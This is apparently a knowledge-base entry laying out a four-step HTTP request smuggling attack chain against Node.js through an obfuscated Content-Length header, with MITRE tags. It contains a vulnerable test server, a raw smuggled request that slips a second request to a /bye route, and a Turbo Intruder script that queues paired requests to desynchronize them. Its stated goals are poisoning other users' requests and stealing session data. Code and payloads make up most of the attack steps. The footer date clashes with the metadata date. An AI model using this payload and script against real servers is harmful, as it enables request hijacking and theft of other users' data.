---
tags:
  - http-smuggling
  - web-exploitation
  - request-desync
type: attack_chain
tools:
  - '[[tools/Node-js]]'
  - '[[tools/Turbo-Intruder]]'
tactics:
  - '[[Initial Access]]'
  - '[[Lateral Movement]]'
commands:
  - '[[commands/run-node-js-http-server]]'
  - '[[commands/send-smuggled-http-request]]'
  - '[[commands/turbo-intruder-desync-script]]'
platforms:
  - Web
  - Node.js
complexity: medium
procedures:
  - '[[procedures/Setup-Node-js-Test-Server-for-HTTP-Smuggling]]'
  - '[[procedures/Craft-and-Send-Smuggled-HTTP-Request]]'
  - '[[procedures/Simulate-Request-Desynchronization-with-Turbo-Intruder]]'
  - '[[procedures/Monitor-and-Verify-HTTP-Smuggling-Impact]]'
step_count: 4
techniques:
  - '[[Exploit Public-Facing Application]]'
description: >-
  Exploits HTTP request smuggling vulnerability in Node.js by obfuscating
  Content-Length headers to desynchronize requests and impact other users.
skill_level: intermediate
impact_level: high
id: 1d65421d-5336-46b3-80d0-53407600fbfc
created_at: '2025-12-13T09:01:21.602Z'
updated_at: '2025-12-13T09:01:21.602Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Lateral Movement]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# HTTP Request Smuggling in Node.js via Content-Length Obfuscation

Multi-stage attack chain demonstrating HTTP request smuggling in Node.js by exploiting improper Content-Length header parsing, leading to request desynchronization and potential data theft.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup Test Server] --> B[Craft Smuggled Request]
    B --> C[Simulate Desynchronization]
    C --> D[Observe Impact]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Node-js]]
- [[tools/Turbo-Intruder]]

### Target Environment

- Web platform with Node.js 18.x
- HTTP server running on port 8082
- Local network access for testing

### Initial Access Requirements

- Access to a Node.js environment
- Ability to send HTTP requests to the target server
- No prior credentials needed

## Detailed Attack Procedures

### Step 1: Setup Test Environment
procedure: [[procedures/Setup-Node-js-Test-Server-for-HTTP-Smuggling]]

**Objective**: Establish a vulnerable Node.js HTTP server to test the smuggling vulnerability.

**Instructions**: Create and run the server script using [[commands/run-node-js-http-server]]:

```javascript
const http = require('http'); const port = 8082; const server = http.createServer((req, res) => { if (req.url === '/hello') { console.log(JSON.stringify(req.headers)); console.log('%s', req.url); res.writeHead(200, { 'Content-Type': 'text/plain' }); res.end('Hello, World!\n'); } else if (req.url === '/bye') { console.log('%s', req.url) console.log(JSON.stringify(req.headers)); res.writeHead(200, { 'Content-Type': 'text/plain' }); const name = req.headers['x-name'] || 'World'; res.end(`Goodbye, ${name}!\n`); } else { res.writeHead(404, { 'Content-Type': 'text/plain' }); res.end('Route not found\n'); } }); server.listen(port, () => { console.log(`Server running at http://localhost:${port}/`); });
```

**Expected Output**: Server running message and readiness to handle requests.

**Success Indicators**:
- Server logs incoming requests
- Routes /hello and /bye respond correctly to normal requests

### Step 2: Craft Malformed Request
procedure: [[procedures/Craft-and-Send-Smuggled-HTTP-Request]]

**Objective**: Construct and send a request that exploits the Content-Length parsing flaw to smuggle a second request.

**Instructions**: Send the smuggled request using [[commands/send-smuggled-http-request]]:

```http
POST /hello HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
 Content-length: 43
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

GET /bye HTTP/1.1
x-name: Bob%s
X-YzBqv:
```

**Expected Output**: Response from the smuggled /bye route instead of /hello.

**Success Indicators**:
- Server processes the smuggled request
- Custom header (x-name) is reflected in the response

### Step 3: Simulate Multi-Request Attack
procedure: [[procedures/Simulate-Request-Desynchronization-with-Turbo-Intruder]]

**Objective**: Use Turbo Intruder to send paired requests demonstrating desynchronization.

**Instructions**: Run the Turbo Intruder script using [[commands/turbo-intruder-desync-script]]:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False,
                           engine=Engine.THREADED
                           )
    for word in range(1, 100):
        if word % 2:
            CleanReq = re.sub(r' Content-length: [0-9]+', 'Null-head: test%s', target.req)
            CleanReq = re.sub(r'GET [^v]*v: ', '\r\n', CleanReq)
            engine.queue(CleanReq, word)
        engine.queue(target.req, word)
def handleResponse(req, interesting):
    table.add(req)
```

**Expected Output**: Table of responses showing mixed or desynchronized requests.

**Success Indicators**:
- Attacker requests poison legitimate ones
- Responses show header consumption

### Step 4: Verify Exploitation Impact
procedure: [[procedures/Monitor-and-Verify-HTTP-Smuggling-Impact]]

**Objective**: Observe and confirm the effects of request smuggling on server responses.

**Instructions**: Monitor server logs and responses for signs of desynchronization, such as /hello requests returning /bye content or stolen session data.

**Expected Output**: Logged evidence of request mixing and path forcing.

**Success Indicators**:
- Responses indicate desync (e.g., wrong route content)
- Potential for session data theft observed

## Attack Chain Summary

### Key Achievements

1. Successful smuggling of requests via header obfuscation
2. Demonstration of request desynchronization
3. Potential for impacting other users through path forcing and data theft

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Lateral Movement]]

*Last updated: 2023-10-01*
